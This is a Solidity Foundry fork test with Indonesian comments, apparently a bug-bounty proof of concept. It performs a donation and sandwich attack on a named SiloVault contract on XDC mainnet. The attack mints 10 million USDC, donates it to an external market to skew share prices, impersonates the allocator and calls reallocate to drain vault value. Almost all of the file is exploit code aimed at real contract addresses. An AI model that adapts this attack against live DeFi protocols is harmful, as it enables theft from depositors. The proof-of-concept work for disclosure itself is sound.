// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC20} from "openzeppelin5/token/ERC20/IERC20.sol";
import {IERC4626} from "openzeppelin5/interfaces/IERC4626.sol";

// Interface untuk SiloVault
interface ISiloVault is IERC4626 {
    struct MarketAllocation {
        IERC4626 market;
        uint256 assets;
    }
    function reallocate(MarketAllocation[] calldata allocations) external;
    function isAllocator(address account) external view returns (bool);
}

contract SiloXDCForkTest is Test {
    // RPC XinFin (XDC)
    string XDC_RPC_URL = "https://xdc-mainnet.gateway.tatum.io/"; 
    
    // Alamat-alamat di XinFin (XDC)
    address constant USDC = 0xfA2958CB79b0491CC627c1557F441eF849Ca8eb1;
    address constant SILO_VAULT = 0x06083Db34F1E915FA5cd4e2A198f3680E3CE9c60; // 9Summits Vault
    address constant EXTERNAL_MARKET = 0xB38658B163E364DfFFDBC895f1b5d658d5e6C439; // Unverified Market
    
    // TUGAS ANDA: Ganti dengan address pengirim (msg.sender) dari transaksi reallocate yang Anda temukan
    address constant ALLOCATOR = 0x8e65743e23Ed13f593E7d4eb7ED3ddE1E1cB9bBf; 

    function setUp() public {
        // Fork jaringan XDC
        uint256 forkId = vm.createFork(XDC_RPC_URL);
        vm.selectFork(forkId);
    }

    function test_BlindSandwichAttackOnXDC() public {
        // 1. Cek Saldo Awal Vault
        uint256 vaultTVLBefore = IERC4626(SILO_VAULT).totalAssets();
        console.log("Vault TVL Sebelum Serangan :", vaultTVLBefore);

        // Pastikan kita punya allocator yang benar (opsional: kita bypass check ini di test)
        // Jika allocator salah, transaksi reallocate akan revert "Not Allocator"
        
        // 2. Persiapan Attacker (Kita cetak 10 Juta USDC)
        address attacker = address(this);
        // Karena USDC XDC mungkin 6 desimal, 10 Juta = 10_000_000 * 1e6
        // Gunakan deal untuk memanipulasi saldo
        deal(USDC, attacker, 10_000_000 * 1e6); 

        console.log("Mulai Blind Donation Attack ke External Market...");
        
        // 3. FRONT-RUN: Donasi paksa (Spot Manipulation) ke External Market
        // Kita paksa market ini "mengira" mereka tiba-tiba kaya, untuk merusak harga share-nya
        vm.startPrank(attacker);
        IERC20(USDC).transfer(EXTERNAL_MARKET, 10_000_000 * 1e6);
        vm.stopPrank();

        // 4. EKSEKUSI VAULT: Impersonate Allocator
        vm.startPrank(ALLOCATOR);
        
        // Kita asumsikan Allocator ingin menarik (redeem) semua aset dari market tersebut
        ISiloVault.MarketAllocation[] memory allocations = new ISiloVault.MarketAllocation[](1);
        allocations[0] = ISiloVault.MarketAllocation({
            market: IERC4626(EXTERNAL_MARKET),
            assets: 0 // Dalam kode SiloVault, assets: 0 biasanya berarti menarik seluruh saldo dari market itu
        });
        
        // Eksekusi fungsi reallocate yang cacat tanpa slippage protection!
        ISiloVault(SILO_VAULT).reallocate(allocations);
        vm.stopPrank();

        // 5. CEK KERUSAKAN VAULT
        uint256 vaultTVLAfter = IERC4626(SILO_VAULT).totalAssets();
        console.log("Vault TVL Setelah Serangan :", vaultTVLAfter);

        if (vaultTVLAfter < vaultTVLBefore) {
            console.log("\n[+] BINGO! SERANGAN SUKSES!");
            console.log("[+] Vault kehilangan:", vaultTVLBefore - vaultTVLAfter, "USDC");
            console.log("[+] Triager Tidak Bisa Membantah Lagi!");
        } else if (vaultTVLAfter > vaultTVLBefore) {
            console.log("\n[-] Aset malah bertambah. Uang donasi kita tertelan oleh market (Mirip Silo.sol)");
        } else {
            console.log("\n[-] Gagal. TVL tidak berubah. External Market kebal terhadap spot donation.");
        }
    }
}
